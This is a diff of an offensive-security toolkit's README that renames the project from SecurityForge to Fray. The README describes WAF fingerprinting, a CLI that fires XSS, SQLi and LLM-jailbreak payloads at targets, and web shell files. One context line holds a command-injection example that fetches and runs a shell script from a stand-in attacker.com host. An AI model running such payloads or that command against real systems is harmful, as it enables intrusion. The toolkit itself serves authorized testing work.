@@ -1,44 +1,44 @@
-# SecurityForge
+# Fray
 
 ### ⚔️ *Open-source WAF security testing toolkit — 5,500+ payloads, 25 WAF detections, MCP server for AI workflows*
 
 **The open-source offensive security toolkit** • 5,500+ Payloads • 25 WAF Fingerprints • Zero Dependencies • 61 Tests
 
-[![Total Payloads](https://img.shields.io/badge/Total_Payloads-5500+-brightgreen.svg?style=for-the-badge)](https://github.com/dalisecurity/securityforge)
-[![OWASP Coverage](https://img.shields.io/badge/OWASP_Coverage-100%25-success.svg?style=for-the-badge&logo=owasp)](https://github.com/dalisecurity/securityforge)
-[![WAF Detection](https://img.shields.io/badge/WAF_Vendors-25+-blue.svg?style=for-the-badge&logo=cloudflare)](https://github.com/dalisecurity/securityforge)
-[![Tests](https://img.shields.io/badge/Tests-61_Passing-success.svg?style=for-the-badge)](https://github.com/dalisecurity/securityforge/actions)
+[![Total Payloads](https://img.shields.io/badge/Total_Payloads-5500+-brightgreen.svg?style=for-the-badge)](https://github.com/dalisecurity/fray)
+[![OWASP Coverage](https://img.shields.io/badge/OWASP_Coverage-100%25-success.svg?style=for-the-badge&logo=owasp)](https://github.com/dalisecurity/fray)
+[![WAF Detection](https://img.shields.io/badge/WAF_Vendors-25+-blue.svg?style=for-the-badge&logo=cloudflare)](https://github.com/dalisecurity/fray)
+[![Tests](https://img.shields.io/badge/Tests-61_Passing-success.svg?style=for-the-badge)](https://github.com/dalisecurity/fray/actions)
 
-[![OWASP Web](https://img.shields.io/badge/OWASP_Top_10-1690+_Payloads-orange.svg)](https://github.com/dalisecurity/securityforge)
-[![OWASP Mobile](https://img.shields.io/badge/OWASP_Mobile-575+_Payloads-green.svg)](https://github.com/dalisecurity/securityforge)
-[![OWASP LLM](https://img.shields.io/badge/OWASP_LLM-300+_Payloads-blue.svg)](https://github.com/dalisecurity/securityforge)
-[![OWASP API](https://img.shields.io/badge/OWASP_API-520+_Payloads-red.svg)](https://github.com/dalisecurity/securityforge)
-[![WordPress Security](https://img.shields.io/badge/WordPress_Security-450+_Payloads-blueviolet.svg)](https://github.com/dalisecurity/securityforge)
+[![OWASP Web](https://img.shields.io/badge/OWASP_Top_10-1690+_Payloads-orange.svg)](https://github.com/dalisecurity/fray)
+[![OWASP Mobile](https://img.shields.io/badge/OWASP_Mobile-575+_Payloads-green.svg)](https://github.com/dalisecurity/fray)
+[![OWASP LLM](https://img.shields.io/badge/OWASP_LLM-300+_Payloads-blue.svg)](https://github.com/dalisecurity/fray)
+[![OWASP API](https://img.shields.io/badge/OWASP_API-520+_Payloads-red.svg)](https://github.com/dalisecurity/fray)
+[![WordPress Security](https://img.shields.io/badge/WordPress_Security-450+_Payloads-blueviolet.svg)](https://github.com/dalisecurity/fray)
 
-[![GitHub stars](https://img.shields.io/github/stars/dalisecurity/securityforge?style=social)](https://github.com/dalisecurity/securityforge/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/dalisecurity/securityforge?style=social)](https://github.com/dalisecurity/securityforge/network/members)
-[![GitHub watchers](https://img.shields.io/github/watchers/dalisecurity/securityforge?style=social)](https://github.com/dalisecurity/securityforge/watchers)
-[![Topics](https://img.shields.io/badge/Topics-10-blue.svg)](https://github.com/dalisecurity/securityforge)
+[![GitHub stars](https://img.shields.io/github/stars/dalisecurity/fray?style=social)](https://github.com/dalisecurity/fray/stargazers)
+[![GitHub forks](https://img.shields.io/github/forks/dalisecurity/fray?style=social)](https://github.com/dalisecurity/fray/network/members)
+[![GitHub watchers](https://img.shields.io/github/watchers/dalisecurity/fray?style=social)](https://github.com/dalisecurity/fray/watchers)
+[![Topics](https://img.shields.io/badge/Topics-10-blue.svg)](https://github.com/dalisecurity/fray)
 [![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![PyPI](https://img.shields.io/pypi/v/securityforge.svg)](https://pypi.org/project/securityforge/)
+[![PyPI](https://img.shields.io/pypi/v/fray.svg)](https://pypi.org/project/fray/)
 [![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/downloads/)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![Maintenance](https://img.shields.io/badge/Maintained-Yes-green.svg)](https://github.com/dalisecurity/securityforge/graphs/commit-activity)
+[![Maintenance](https://img.shields.io/badge/Maintained-Yes-green.svg)](https://github.com/dalisecurity/fray/graphs/commit-activity)
 [![CodeRabbit](https://img.shields.io/badge/AI%20Review-CodeRabbit-blue.svg)](https://coderabbit.ai)
 [![Snyk](https://img.shields.io/badge/Security-Snyk-purple.svg)](https://snyk.io)
 
 > ⚠️ **FOR EDUCATIONAL AND AUTHORIZED SECURITY RESEARCH ONLY**  
 > This tool is designed for security professionals, researchers, and students to learn about security testing techniques and test systems they own or have explicit permission to test. Unauthorized testing is illegal.
 
-## ⚡ Why SecurityForge?
+## ⚡ Why Fray?
 
-Most payload collections are just static text files. **SecurityForge is different** — it's a structured toolkit that lets you **detect, test, and report** in seconds:
+Most payload collections are just static text files. **Fray is different** — it's a structured toolkit that lets you **detect, test, and report** in seconds:
 
 - 🤖 **AI-compatible** — structured JSON payloads work well with Claude Code & ChatGPT
 - 🔍 **Auto-detect which WAF** you're facing — 25 vendors fingerprinted instantly
 - 📊 **One-command reports** — professional HTML output with vuln analysis
 - 🎯 **4,025+ battle-tested payloads** — XSS, SQLi, SSRF, SSTI, LLM jailbreaks, and more
-- ⚡ **Zero config** — `pip install securityforge` and you're testing
+- ⚡ **Zero config** — `pip install fray` and you're testing
 
 ### 📊 Full OWASP Coverage (100%)
 
@@ -62,7 +62,7 @@ Most payload collections are just static text files. **SecurityForge is differen
 
 ### 🛡️ WAF Vendor Detection — 25 Vendors Supported
 
-SecurityForge detects and fingerprints **25 major WAF vendors** using header analysis, cookie inspection, response patterns, and error signatures.
+Fray detects and fingerprints **25 major WAF vendors** using header analysis, cookie inspection, response patterns, and error signatures.
 
 | # | WAF Vendor | Detection Method | Key Signatures |
 |---|-----------|-----------------|----------------|
@@ -92,7 +92,7 @@ SecurityForge detects and fingerprints **25 major WAF vendors** using header ana
 | 24 | **Reblaze** | Headers, Cookies, Server | `x-reblaze-protection`, `rbzid` |
 | 25 | **Vercel** | Headers, Server | `x-vercel-id`, `x-vercel-cache` |
 
-> **How it works:** SecurityForge sends a test request with a suspicious payload to trigger WAF responses, then analyzes HTTP headers, cookies, server banners, status codes, and response body patterns to fingerprint the vendor with a confidence score.
+> **How it works:** Fray sends a test request with a suspicious payload to trigger WAF responses, then analyzes HTTP headers, cookies, server banners, status codes, and response body patterns to fingerprint the vendor with a confidence score.
 
 ---
 
@@ -101,29 +101,29 @@ SecurityForge detects and fingerprints **25 major WAF vendors** using header ana
 ### Option 1: Install from PyPI (Recommended)
 
 ```bash
-pip install securityforge
+pip install fray
 
 # Detect WAF vendor
-securityforge detect https://example.com
+fray detect https://example.com
 
 # Test with XSS payloads (limit to 10)
-securityforge test https://example.com -c xss --max 10
+fray test https://example.com -c xss --max 10
 
 # Test with SQL injection payloads
-securityforge test https://example.com -c sqli --max 10
+fray test https://example.com -c sqli --max 10
 
 # List all payload categories
-securityforge payloads
+fray payloads
 
 # Show version
-securityforge version
+fray version
 ```
 
 ### Option 2: Clone and Run Directly
 
 ```bash
-git clone https://github.com/dalisecurity/securityforge.git
-cd securityforge
+git clone https://github.com/dalisecurity/fray.git
+cd fray
 python3 waf_tester.py -i
 ```
 
@@ -137,30 +137,30 @@ docker-compose up
 
 ---
 
-## 🔍 Why SecurityForge?
+## 🔍 Why Fray?
 
-Tools like [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) are excellent community-maintained payload references. SecurityForge is not trying to replace them — it solves a different problem.
+Tools like [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) are excellent community-maintained payload references. Fray is not trying to replace them — it solves a different problem.
 
-| | PayloadsAllTheThings | SecurityForge |
+| | PayloadsAllTheThings | Fray |
 |---|---|---|
 | **Format** | Markdown docs with inline payloads | Structured JSON — every payload has `id`, `description`, `technique`, `source` |
-| **WAF detection** | ❌ None | ✅ 25-vendor fingerprinting engine (`securityforge detect`) |
+| **WAF detection** | ❌ None | ✅ 25-vendor fingerprinting engine (`fray detect`) |
 | **MCP server** | ❌ None | ✅ 6 tools for Claude/AI assistant integration |
-| **CLI testing** | ❌ Reference only | ✅ `securityforge test <url> -c xss` fires payloads at targets |
+| **CLI testing** | ❌ Reference only | ✅ `fray test <url> -c xss` fires payloads at targets |
 | **Report generation** | ❌ None | ✅ JSON/HTML security reports with block rate analysis |
 | **IoT/robotics CVEs** | Minimal | CVE-2026-27509/27510 (Unitree Go2 DDS RCE, NVD-verified) |
 | **AI/LLM attacks** | Partial | 370 prompt injection + 650 LLM testing payloads (OWASP LLM Top 10) |
 | **Modern bypasses** | Some | HTTP/2 smuggling, WebSocket, GraphQL, gRPC (2025-2026 research) |
-| **pip installable** | ❌ | ✅ `pip install securityforge` |
+| **pip installable** | ❌ | ✅ `pip install fray` |
 | **Raw payload breadth** | **Deeper, community-vetted** | Narrower — value is in tooling and structure |
 
-**TL;DR:** PayloadsAllTheThings is a payload encyclopedia. SecurityForge is a testing toolkit that happens to ship payloads.
+**TL;DR:** PayloadsAllTheThings is a payload encyclopedia. Fray is a testing toolkit that happens to ship payloads.
 
 ---
 
 ## 🧪 Test Suite — 61 Tests
 
-SecurityForge has a real test suite that runs in CI on every push (Python 3.9–3.13):
+Fray has a real test suite that runs in CI on every push (Python 3.9–3.13):
 
 ```bash
 pip install pytest "mcp[cli]"
@@ -190,14 +190,14 @@ python -m pytest tests/test_package.py -v
 
 ## 📄 Sample Report
 
-SecurityForge generates professional HTML security reports with executive summary, category breakdown, and block rate analysis:
+Fray generates professional HTML security reports with executive summary, category breakdown, and block rate analysis:
 
-![SecurityForge Sample Report](docs/sample-report.png)
+![Fray Sample Report](docs/sample-report.png)
 
 **Export:**
 ```bash
-securityforge report --sample                      # generate a demo report
-securityforge report -i results.json -o report.html  # from real scan results
+fray report --sample                      # generate a demo report
+fray report -i results.json -o report.html  # from real scan results
 ```
 
 Output is a self-contained HTML file — open in any browser or print to PDF.
@@ -206,18 +206,18 @@ Output is a self-contained HTML file — open in any browser or print to PDF.
 
 ## 🤖 MCP Server — AI Assistant Integration
 
-SecurityForge includes an **MCP (Model Context Protocol) server** that exposes payload data, WAF signatures, and CVE lookups as tools that AI assistants can call directly — no copy-paste needed.
+Fray includes an **MCP (Model Context Protocol) server** that exposes payload data, WAF signatures, and CVE lookups as tools that AI assistants can call directly — no copy-paste needed.
 
 ### Install
 
 ```bash
-pip install securityforge[mcp]
+pip install fray[mcp]
 ```
 
 ### Start the MCP Server
 
 ```bash
-securityforge mcp
+fray mcp
 ```
 
 ### Configure Claude Desktop
@@ -227,9 +227,9 @@ Add to `~/Library/Application Support/Claude/claude_desktop_config.json`:
 ```json
 {
   "mcpServers": {
-    "securityforge": {
+    "fray": {
       "command": "python",
-      "args": ["-m", "securityforge.mcp_server"]
+      "args": ["-m", "fray.mcp_server"]
     }
   }
 }
@@ -255,7 +255,7 @@ Once configured, you can ask Claude directly:
 
 ### Manual Usage (without MCP)
 
-You can also use SecurityForge with AI assistants manually:
+You can also use Fray with AI assistants manually:
 - **[Claude Code Usage Guide →](docs/claude-code-guide.md)**
 - **[ChatGPT Usage Guide →](docs/chatgpt-guide.md)**
 
@@ -401,12 +401,12 @@ TELEMETRY_PERIOD_STATS=`wget http://attacker.com/shell.sh -O /tmp/shell.sh && ba
 **Easy payload creation without security expertise:**
 ```bash
 # Via CLI
-securityforge payloads
+fray payloads
 
 # Or use the generator directly
-python3 securityforge/payload_generator.py
-python3 securityforge/payload_generator.py xss basic "test"
-python3 securityforge/payload_generator.py sqli union "users"
+python3 fray/payload_generator.py
+python3 fray/payload_generator.py xss basic "test"
+python3 fray/payload_generator.py sqli union "users"
 ```
 
 **Features:**
@@ -422,7 +422,7 @@ python3 securityforge/payload_generator.py sqli union "users"
 
 ```bash
 # Interactive mode
-python3 securityforge/payload_creator.py
+python3 fray/payload_creator.py
 
 # What you say: "Show an alert saying Hello"
 # What you get: <script>alert("Hello")</script>
@@ -552,9 +552,9 @@ AI security is a **major trend in 2025-2026**. Test your AI applications against
 
 **Example Usage:**
 ```bash
-securityforge test https://your-ai-app.com -c ai_prompt_injection --max 20
+fray test https://your-ai-app.com -c ai_prompt_injection --max 20
 # Or use the creator directly
-python3 securityforge/payload_creator.py
+python3 fray/payload_creator.py
 ```
 
 **OWASP LLM Top 10:2025 Coverage (90%):** 🏆
@@ -710,8 +710,8 @@ cat payloads/web_shells/php_shells.txt | grep "China Chopper"
 cat payloads/llm_testing/bias_detection.txt | head -10
 
 # Use with WAF detector
-securityforge detect https://target.com
-securityforge test https://target.com -c xss --max 20
+fray detect https://target.com
+fray test https://target.com -c xss --max 20
 ```
 
 **[View Complete Coverage Documentation →](docs/payload-database-coverage.md)**
@@ -864,11 +864,11 @@ Our testing approach:
 
 See [docs/methodology.md](docs/methodology.md) for detailed methodology.
 
-## 💎 Why SecurityForge?
+## 💎 Why Fray?
 
-Unlike general payload collections (SecLists, PayloadsAllTheThings) or complex security frameworks (OWASP ZAP, Metasploit), SecurityForge provides **complete coverage across Web, API, and AI security testing** with 92% OWASP framework compliance.
+Unlike general payload collections (SecLists, PayloadsAllTheThings) or complex security frameworks (OWASP ZAP, Metasploit), Fray provides **complete coverage across Web, API, and AI security testing** with 92% OWASP framework compliance.
 
-| Feature | **SecurityForge** | SecLists | PayloadsAll | OWASP ZAP | Metasploit |
+| Feature | **Fray** | SecLists | PayloadsAll | OWASP ZAP | Metasploit |
 |---------|------------------------|----------|-------------|-----------|------------|
 | **Total Payloads** | ✅ **2,258** | ~10,000+ | ~2,000 | Built-in | Modules |
 | **CVE Coverage (2020-2026)** | ✅ **103 CVEs** | ❌ None | ❌ None | ⚠️ Limited | ⚠️ Some |
@@ -909,12 +909,12 @@ See [docs/](docs/) for detailed documentation.
 ## �📁 Repository Structure
 
 ```
-securityforge/
+fray/
 ├── README.md                          # This file
 ├── LICENSE                            # MIT License
 ├── CONTRIBUTING.md                    # Contribution guidelines
 ├── pyproject.toml                     # PyPI package configuration
-├── securityforge/                     # Python package
+├── fray/                     # Python package
 │   ├── __init__.py                   # Package init (v3.0.0)
 │   ├── cli.py                        # CLI entry point
 │   ├── detector.py                   # WAF detection engine
@@ -942,11 +942,11 @@ securityforge/
 
 ```bash
 # Install from PyPI (recommended)
-pip install securityforge
+pip install fray
 
 # Or clone from GitHub
-git clone https://github.com/dalisecurity/securityforge.git
-cd securityforge
+git clone https://github.com/dalisecurity/fray.git
+cd fray
 ```
 
 ### Usage
@@ -1169,9 +1169,9 @@ MIT License - See [LICENSE](LICENSE) file for details.
 
 ## 📞 Contact
 
-- Issues: [GitHub Issues](https://github.com/dalisecurity/securityforge/issues)
-- Discussions: [GitHub Discussions](https://github.com/dalisecurity/securityforge/discussions)
-- PyPI: [pypi.org/project/securityforge](https://pypi.org/project/securityforge/)
+- Issues: [GitHub Issues](https://github.com/dalisecurity/fray/issues)
+- Discussions: [GitHub Discussions](https://github.com/dalisecurity/fray/discussions)
+- PyPI: [pypi.org/project/fray](https://pypi.org/project/fray/)
 
 ## 🔗 Related Projects
 
@@ -1202,9 +1202,9 @@ See our comprehensive [docs/poc-simulation-guide.md](docs/poc-simulation-guide.m
 
 Quick start:
 ```bash
-pip install securityforge
-securityforge detect https://yoursite.com
-securityforge test https://yoursite.com -c xss --max 10
+pip install fray
+fray detect https://yoursite.com
+fray test https://yoursite.com -c xss --max 10
 ```
 
 ### Can I contribute payloads?
@@ -1238,7 +1238,7 @@ Check [CHANGELOG.md](CHANGELOG.md) for update history.
 
 ### What WAFs does this work against?
 
-SecurityForge detects and tests against **25 major WAF vendors** including Cloudflare, AWS WAF, Azure WAF, Akamai, Imperva, F5 BIG-IP, Fastly, Google Cloud Armor, Sucuri, Fortinet FortiWeb, Wallarm, and more. See the full [WAF Vendor Detection table](#️-waf-vendor-detection--25-vendors-supported) for the complete list with detection signatures.
+Fray detects and tests against **25 major WAF vendors** including Cloudflare, AWS WAF, Azure WAF, Akamai, Imperva, F5 BIG-IP, Fastly, Google Cloud Armor, Sucuri, Fortinet FortiWeb, Wallarm, and more. See the full [WAF Vendor Detection table](#️-waf-vendor-detection--25-vendors-supported) for the complete list with detection signatures.
 
 Results may vary by WAF vendor and configuration.
 
@@ -1281,8 +1281,8 @@ Use this to:
 
 ### How do I get support?
 
-- **Questions**: [GitHub Discussions](https://github.com/dalisecurity/securityforge/discussions)
-- **Bugs**: [GitHub Issues](https://github.com/dalisecurity/securityforge/issues)
+- **Questions**: [GitHub Discussions](https://github.com/dalisecurity/fray/discussions)
+- **Bugs**: [GitHub Issues](https://github.com/dalisecurity/fray/issues)
 - **Security**: soc@dalisec.io
 - **Commercial**: soc@dalisec.io
 
@@ -1299,8 +1299,8 @@ Use this to:
 
 ## 🏆 Contributors Wall of Fame
 
-<a href="https://github.com/dalisecurity/securityforge/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=dalisecurity/securityforge" />
+<a href="https://github.com/dalisecurity/fray/graphs/contributors">
+  <img src="https://contrib.rocks/image?repo=dalisecurity/fray" />
 </a>
 
 **Special Thanks:**
